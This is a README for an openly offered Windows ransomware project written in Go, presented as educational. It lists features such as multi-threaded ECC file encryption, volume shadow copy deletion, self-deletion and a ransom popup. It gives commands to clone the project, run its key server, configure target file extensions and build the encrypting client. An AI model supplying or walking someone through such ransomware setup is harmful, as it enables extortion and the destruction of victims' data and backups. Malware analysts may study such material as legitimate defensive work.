# Ransomware-For-Study

[简体中文](./README-zh-cn.md)

Project Description:

This is a basic ransomware project framework for educational purposes, designed to:
- Provide insights for cybersecurity professionals combating malware
- Offer beginners in malware analysis a basic ransomware attack workflow

**WARNING:**
> 
    - This project is FOR EDUCATIONAL PURPOSES ONLY
    - STRICTLY PROHIBITED for any illegal use
    - The author bears no responsibility for misuse

---

## Key Features

1. Mutex creation to prevent multiple instances
2. ECC encryption with separate public/private key storage (only public key exposed during encryption)
3. Multi-threaded file encryption
4. Post-encryption notepad popup functionality
5. Self-deletion after encryption
6. HTTPS for public key transmission
7. Volume shadow copy deletion
8. Multiple encryption method implementations

---

**TODO (Pending Features):**

1. Multi-folder polling

## Installation

**Important:**
This project only works on Windows OS!

### 1. Download Project
```bash
git clone https://github.com/CuteCuteYu/RansomwareFS
```

### 2. Initialize Project
```bash
cd RansomwareFS
go mod tidy
```

### 3. Start Public Key Server

**Recommendation:** Replace the SSL certificates with ones from other sources before starting

Certificate location:
`ssl-cert` folder

```bash
go run ./server.go ./handler.go
```

### 4. Configuration

#### 4.1 File Extensions, Encryption Threads and Method
`./client/client.go`
```go
const (
	Method        string = "CUSTOM"
	FileExtension        = ".exe"
	ThreadNumber         = 10 // Number of threads to use for encryption
	FilePath      string = ""
)
```

#### 4.2 Server Address for Public Key Retrieval
`./client/ecc/ecc_get_pub_key/get_pub_key.go`
```go
const (
	ServerAddr = "localhost"
	ServerPort = "8080"
)
```

#### 4.3 Mutex Name Configuration
`./client/mutex/mutex.go`
```go
mutexName := "Global\\mypkg_mutex"
```

### 5. Run or Build Client

#### 5.1 Direct Run
```bash
go run ./cmd/client/main.go
```

#### 5.2 Build Executable

(run as Administrator can use delete_shadow!)

```bash
go build ./cmd/client/main.go
```

### 6. Custom Encryption Method Implementation

`./client/custom_example/custom_example.go` provides an example implementation

Required parameters:
```go
// Caesar cipher encryption
// Parameters:
//   - data: byte array to be encrypted
//   - shift: custom option for encryption method
// Returns:
//   - encrypted byte array
func CaesarEncrypt(data []byte, shift int) []byte {
	encrypted := make([]byte, len(data))
	for i, b := range data {
		encrypted[i] = byte((int(b) + shift) % 256)
	}
	return encrypted
}
```
